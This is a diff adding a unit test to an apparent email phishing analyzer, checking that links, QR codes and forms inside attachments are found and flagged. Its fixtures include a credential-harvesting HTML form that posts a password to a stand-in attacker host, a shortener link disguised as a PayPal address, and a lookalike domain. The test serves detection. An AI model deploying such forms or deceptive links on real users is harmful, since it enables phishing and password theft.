@@ -79,3 +79,36 @@ test("reads links from a text-only body", () => {
   assert.deepEqual(report.links.map((l) => [l.origin, l.url.final]), [["text", "https://bit.ly/abc"]]);
   assert.deepEqual(report.findings.map((f) => f.id), ["url.shortener"]);
 });
+
+test("analyses links, QR codes and forms found in attachments", () => {
+  const report = analyzeLinks(htmlEmail(null), null, { fromDomain: null, references }, [
+    {
+      name: "login.html",
+      html: parse(`<form action="https://evil.example/collect" method="post"><input type="password" name="p"></form>
+        <a href="https://bit.ly/x">https://www.paypal.com</a>`),
+      urls: [],
+      qr: [],
+    },
+    { name: "terms.pdf", html: null, urls: ["https://paypa1.com/doc"], qr: [] },
+    { name: "mfa.png", html: null, urls: [], qr: ["https://evil.example/qr", "WIFI:S:office;;"] },
+  ]);
+  assert.deepEqual(
+    report.links.map((l) => [l.source, l.attachment, l.origin, l.url.final]),
+    [
+      ["attachment", "login.html", "form", "https://evil.example/collect"],
+      ["attachment", "login.html", "a", "https://bit.ly/x"],
+      ["attachment", "terms.pdf", "file", "https://paypa1.com/doc"],
+      ["attachment", "mfa.png", "qr", "https://evil.example/qr"],
+    ],
+  );
+  assert.equal(report.forms[0].attachment, "login.html");
+  const password = report.findings.find((f) => f.id === "html.password-form");
+  assert.equal(password?.title, "Password form in an attachment");
+  assert.deepEqual(password?.evidence, ["POST https://evil.example/collect — p (in login.html)"]);
+  assert.deepEqual(report.findings.map((f) => f.id), [
+    "link.deceptive",
+    "url.lookalike",
+    "url.shortener",
+    "html.password-form",
+  ]);
+});
